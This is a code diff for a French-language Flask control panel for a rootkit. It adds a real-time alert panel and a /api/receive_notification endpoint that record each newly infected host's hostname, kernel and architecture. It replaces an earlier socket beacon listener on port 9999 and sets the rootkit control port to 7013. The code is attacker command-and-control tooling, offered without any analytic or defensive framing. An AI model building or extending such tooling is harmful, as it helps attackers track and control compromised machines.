@@ -16,54 +16,6 @@ import json
 notifications = []
 notifications_lock = threading.Lock()
 
-def serveur_notifications():
-    try:
-        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server_socket.bind(('0.0.0.0', 9999))
-        server_socket.listen(5)
-        
-        print(f"[NOTIFICATIONS] Serveur d'alertes démarré sur le port 9999")
-        
-        while True:
-            try:
-                client_socket, addr = server_socket.accept()
-                data = client_socket.recv(2048).decode()
-                client_socket.close()
-                
-                if data.startswith("ROOTKIT_ALERT"):
-                    notification = {
-                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                        'source_ip': addr[0],
-                        'message': data,
-                        'type': 'INSTALLATION'
-                    }
-                    
-                    lines = data.split('\n')
-                    for line in lines:
-                        if 'Hostname:' in line:
-                            notification['hostname'] = line.split(':', 1)[1].strip()
-                        elif 'Kernel:' in line:
-                            notification['kernel'] = line.split(':', 1)[1].strip()
-                        elif 'Architecture:' in line:
-                            notification['architecture'] = line.split(':', 1)[1].strip()
-                    
-                    with notifications_lock:
-                        notifications.append(notification)
-                        if len(notifications) > 50:
-                            notifications.pop(0)
-                    
-                    print(f"[ALERT] Nouveau rootkit installé sur {notification.get('hostname', 'UNKNOWN')} ({addr[0]})")
-                
-            except Exception as e:
-                print(f"[NOTIFICATIONS] Erreur: {e}")
-                
-    except Exception as e:
-        print(f"[NOTIFICATIONS] Erreur serveur: {e}")
-
-notification_thread = threading.Thread(target=serveur_notifications, daemon=True)
-notification_thread.start()
-
 app = Flask(__name__)
 app.secret_key = 'clef_secrete_rootkit_2024'
 UPLOAD_FOLDER = '/tmp/flask_uploads'
@@ -94,6 +46,29 @@ def auth_page():
                 display: flex;
                 justify-content: center;
                 align-items: center;
+                flex-direction: column;
+            }
+            .notifications-panel {
+                background-color: #111;
+                border: 2px solid #f00;
+                padding: 10px;
+                margin-bottom: 20px;
+                max-height: 150px;
+                width: 600px;
+            }
+            .notification-item {
+                border-bottom: 1px solid #333;
+                padding: 5px 0;
+                color: #ff0;
+                font-size: 12px;
+            }
+            .notification-new {
+                background-color: #220000;
+                animation: blink 2s infinite;
+            }
+            @keyframes blink {
+                0%, 50% { background-color: #220000; }
+                51%, 100% { background-color: #111; }
             }
             .auth-container {
                 background-color: #111;
@@ -144,13 +119,22 @@ def auth_page():
         </style>
     </head>
     <body>
+        <div class="notifications-panel">
+            <div style="color: #f00; font-weight: bold; margin-bottom: 5px;">
+                🚨 ALERTES ROOTKIT EN TEMPS RÉEL (<span id="notification-count">0</span>)
+            </div>
+            <div id="notifications-list" style="max-height: 100px; overflow-y: auto; background-color: #111; border: 1px solid #f00; padding: 5px;">
+                <div style="color: #555;">En attente d'alertes...</div>
+            </div>
+        </div>
+        
         <div class="auth-container">
             <div class="auth-title">☠️ ROOTKIT ACCESS ☠️</div>
             <div class="step">Étape 1: Configuration de la connexion</div>
             
             <form id="auth-form">
                 <input type="text" id="target-ip" class="auth-input" placeholder="Adresse IP cible" value="192.168.56.5" required>
-                <input type="text" id="target-port" class="auth-input" placeholder="Port" value="7012" required>
+                <input type="text" id="target-port" class="auth-input" placeholder="Port" value="7013" required>
                 <input type="password" id="password" class="auth-input" placeholder="Mot de passe rootkit" required>
                 <button type="submit" class="auth-button">CONNECTER ET AUTHENTIFIER</button>
             </form>
@@ -159,6 +143,43 @@ def auth_page():
         </div>
         
         <script>
+            let lastNotificationCheck = 0;
+
+            function actualiserNotifications() {
+                fetch('/api/get_notifications')
+                .then(response => response.json())
+                .then(data => {
+                    const notificationsList = document.getElementById('notifications-list');
+                    const notificationCount = document.getElementById('notification-count');
+                    
+                    if (data.notifications && data.notifications.length > 0) {
+                        notificationCount.textContent = data.notifications.length;
+                        
+                        let html = '';
+                        data.notifications.slice(-3).reverse().forEach((notif, index) => {
+                            const isNew = index < (data.notifications.length - lastNotificationCheck);
+                            html += `<div class="notification-item ${isNew ? 'notification-new' : ''}">
+                                <strong>[${notif.timestamp}]</strong> 
+                                ${notif.hostname || 'UNKNOWN'} (${notif.source_ip}) - ${notif.status || 'INSTALLE'}
+                                <br><small>Kernel: ${notif.kernel || 'Unknown'} | Arch: ${notif.architecture || 'Unknown'} | Port: ${notif.port_controle || '7013'}</small>
+                            </div>`;
+                        });
+                        
+                        notificationsList.innerHTML = html;
+                        lastNotificationCheck = data.notifications.length;
+                    } else {
+                        notificationCount.textContent = '0';
+                        notificationsList.innerHTML = '<div style="color: #555;">Aucune alerte reçue</div>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur récupération notifications:', error);
+                });
+            }
+            
+            setInterval(actualiserNotifications, 3000);
+            setTimeout(actualiserNotifications, 1000);
+            
             document.getElementById('auth-form').addEventListener('submit', function(e) {
                 e.preventDefault();
                 
@@ -549,9 +570,10 @@ def main_interface():
                         data.notifications.slice(-3).reverse().forEach((notif, index) => {
                             const isNew = index < (data.notifications.length - lastNotificationCheck);
                             html += `<div class="notification-item ${isNew ? 'notification-new' : ''}">
-                                <strong>[${notif.timestamp}]</strong> 
-                                ${notif.hostname || 'UNKNOWN'} (${notif.source_ip})
-                            </div>`;
+                                        <strong>[${notif.timestamp}]</strong> 
+                                        ${notif.hostname || 'UNKNOWN'} (${notif.source_ip}) - ${notif.status || 'INSTALLE'}
+                                        <br><small>Kernel: ${notif.kernel || 'Unknown'} | Arch: ${notif.architecture || 'Unknown'} | Port: ${notif.port_controle || '7013'}</small>
+                                    </div>`;
                         });
                         
                         notificationsList.innerHTML = html;
@@ -890,6 +912,35 @@ def main_interface():
     </body>
     </html>
     '''
+@app.route('/api/receive_notification', methods=['POST'])
+def receive_notification():
+    try:
+        data = request.json
+        print(f"[NOTIFICATION REÇUE] {data}")
+        
+        notification = {
+            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'source_ip': request.remote_addr,
+            'type': data.get('type', 'ROOTKIT_ALERT'),
+            'hostname': data.get('hostname', 'UNKNOWN'),
+            'kernel': data.get('kernel', 'Unknown'),
+            'architecture': data.get('architecture', 'Unknown'),
+            'status': data.get('status', 'INSTALLE'),
+            'port_controle': data.get('port_controle', 7013)
+        }
+        
+        with notifications_lock:
+            notifications.append(notification)
+            if len(notifications) > 50:
+                notifications.pop(0)
+        
+        print(f"[ALERT] Nouveau rootkit installé sur {notification['hostname']} ({notification['source_ip']})")
+        
+        return jsonify({"status": "success", "message": "Notification reçue"}), 200
+        
+    except Exception as e:
+        print(f"[ERREUR] Erreur réception notification: {e}")
+        return jsonify({"error": str(e)}), 500
 
 @app.route('/api/verifier_port', methods=['POST'])
 def verifier_port():
@@ -1214,3 +1265,4 @@ if __name__ == '__main__':
     print("Interface web: http://0.0.0.0:5000")
     print("Upload via wget disponible")
     app.run(host='0.0.0.0', port=5000, debug=True)
+
